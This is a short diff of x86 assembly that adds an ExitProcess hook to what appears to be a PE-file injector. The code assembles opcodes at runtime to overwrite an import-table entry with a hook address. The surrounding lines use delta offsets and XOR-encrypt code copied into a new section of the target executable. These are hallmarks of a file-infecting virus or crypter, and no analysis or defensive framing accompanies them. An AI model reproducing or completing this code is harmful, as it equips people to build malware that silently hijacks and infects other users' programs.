@@ -46,6 +46,33 @@ rol	eax, 8
 mov	al, ah
 mov	[DELTA XorCrypt], eax
 
+
+; PATCH HOOK EXIT PROCESS
+mov	edi, offset hookExitProcess
+add	edi, ebp
+mov	eax, 0B8h ; mov eax, imm32
+stosb
+mov	eax, [DELTA BaseImage]
+mov	edx, [DELTA VAKernelIAT]
+add	eax, edx
+stosd
+mov	eax, 0B9h ; mov ecx, imm32
+stosb
+mov	eax, [DELTA OffsetExitProcess]
+mov	edx, [DELTA BaseImage]
+add	eax, edx
+stosd
+mov	eax, 0008Bh ; mov eax, [eax]
+stosw
+mov	eax, 0C803h ; add ecx, eax
+stosw
+mov	eax, 001C7h ; mov [ecx], imm32
+stosw
+mov	eax, 042424242h ; Hook Function
+stosd
+
+
+
 ; INSERTING NEW SECTION - OPCODE COPY WITH ENCRYPTION
 mov	ecx, endInject - endPatcher
 mov	edi, [DELTA PeFileMap] ; Destination bytes
@@ -58,4 +85,3 @@ lodsb
 xor	eax, [DELTA XorCrypt] ; Encrypt
 stosb
 loop	createNewSection
-
